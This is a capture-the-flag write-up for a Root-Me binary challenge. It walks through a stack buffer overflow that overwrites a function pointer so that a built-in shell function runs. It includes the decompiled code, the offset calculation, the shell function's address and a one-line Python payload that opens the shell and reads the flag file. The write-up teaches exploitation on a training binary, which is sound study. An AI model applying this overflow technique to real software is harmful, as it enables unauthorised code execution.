### S0lv3d by H4yicl3
First I download binary file with my scp-script

````
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```
I use IDA to analysis the code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buffer; // [sp+1Ch] [bp-84h]@1	 //the position of buffer is sp+0x1c	
  int (*v5)(void); // [sp+9Ch] [bp-4h]@2  //the position of pointer function is sp+0x9c

  v5 = sup;
  fgets((char *)&v4, 133, stdin);
  return v5();
}
```

We already have the position of pointer function and buffer we can overflow the buffer try to change the address pointer function .

```
address function - address buffer = sp+0x9c - (sp+0x1c) = 0x80 = 128


|    function	|
|    pointer	|<------ overflow this
|    +	//////	|
|    |	buffer	| 
|    |  128byte	| 
|    |	//////	|
|    |		|
|		| stack

```
see the stack may be you know !
This is how we understand the stack and overflow look like .Now we get idea.
But where we want point to?

In the program we already have a function shell to excute /bin/dash
SO we just redirect program point to it !!

use IDA or GDB we can know the address of shell function
```asm
.text:08048464 shell           proc near	
.text:08048464                 push    ebp
.text:08048465                 mov     ebp, esp
.text:08048467                 sub     esp, 18h
.text:0804846A                 mov     dword ptr [esp], offset command ; "/bin/dash"
.text:08048471                 call    _system
.text:08048476                 leave
.text:08048477                 retn
.text:08048477 shell           endp

```
shell is at 0x08048464
in memory we need change it to little endian 
> shell = "\x64\x84\x04\x08"
```python
(python -c 'print "A"*128+"\x64\x84\x04\x08"';cat)|./ch15

```

Now we have permission to cat file .passwd!
